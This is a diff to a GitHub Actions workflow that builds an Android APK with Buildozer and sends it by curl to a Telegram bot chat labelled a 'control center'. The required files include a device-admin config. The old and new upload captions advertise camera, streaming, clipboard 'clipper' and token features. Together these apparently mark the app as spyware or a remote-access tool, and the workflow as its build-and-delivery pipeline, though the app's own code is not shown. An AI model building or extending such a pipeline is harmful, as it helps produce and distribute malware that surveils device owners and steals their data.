@@ -1,6 +1,6 @@
 name: Build Android APK
 
-on: 
+on:
   push:
     branches: [ main ]
   workflow_dispatch:
@@ -36,19 +36,65 @@ jobs:
           sudo apt install -y git zip unzip autoconf libtool pkg-config zlib1g-dev libncurses5-dev libncursesw5-dev libtinfo5 cmake libffi-dev libssl-dev shared-mime-info
           pip install --user --upgrade Cython==0.29.33 buildozer
 
+      - name: Verify required project files
+        run: |
+          echo "🔍 Checking essential files..."
+          MISSING=0
+          for file in project/main.py project/buildozer.spec project/config/device_admin.xml project/android/AndroidManifest.xml project/res/drawable/ic_launcher.png; do
+            if [ ! -f "$file" ]; then
+              echo "❌ MISSING FILE: $file"
+              MISSING=1
+            else
+              echo "✅ $file exists"
+            fi
+          done
+          if [ $MISSING -eq 1 ]; then
+            echo "ERROR: One or more required files are missing. Check the list above."
+            exit 1
+          fi
+          echo "✅ All required files present."
+
       - name: Build with Buildozer
         run: |
           export PATH=$PATH:$HOME/.local/bin
           cd project
           mkdir -p .buildozer/android/platform
-          yes | buildozer -v android debug
-        env:
-          ACCEPT_SDK_LICENSE: "yes"
+          echo "🚀 Starting Buildozer build..."
+          yes | buildozer -v android debug 2>&1 | tee build_log.txt
+          if [ ${PIPESTATUS[0]} -ne 0 ]; then
+            echo "❌ Buildozer build failed. Error log (last 50 lines):"
+            tail -n 50 build_log.txt
+            exit 1
+          fi
+          echo "✅ Buildozer build completed successfully."
+
+      - name: Find and verify APK
+        run: |
+          cd project
+          APK_PATH=$(find bin -name "*.apk" | head -n 1)
+          if [ -z "$APK_PATH" ]; then
+            echo "❌ No APK file found in project/bin/"
+            echo "Files in bin:"
+            ls -la bin/ || echo "bin directory empty or missing"
+            exit 1
+          fi
+          echo "APK_PATH=$APK_PATH" >> $GITHUB_ENV
+          echo "✅ APK found: $APK_PATH"
+          ls -lh "$APK_PATH"
 
       - name: Send APK to Telegram
         run: |
-          APK_PATH=$(find project/bin -name "*.apk" | head -n 1)
+          APK_PATH="${{ env.APK_PATH }}"
+          if [ -z "$APK_PATH" ]; then
+            echo "❌ APK_PATH not set. Skipping send."
+            exit 1
+          fi
+          if [ ! -f "$APK_PATH" ]; then
+            echo "❌ APK file not found at $APK_PATH"
+            exit 1
+          fi
           curl -v -F "chat_id=${{ secrets.TELEGRAM_CONTROL_CENTER_ID }}" \
                -F "document=@$APK_PATH" \
-               -F "caption=✅ APK v2.0 - Full Suite (كاميرا، بث، تشفير، حذف آمن، كليبر، توكنات)" \
+               -F "caption=✅ APK v2.0 - Full Suite (Camera, Stream, Encrypt, Clipboard, Tokens)" \
                https://api.telegram.org/bot${{ secrets.TELEGRAM_BOT_1_TOKEN }}/sendDocument
+          echo "✅ APK sent to Telegram."
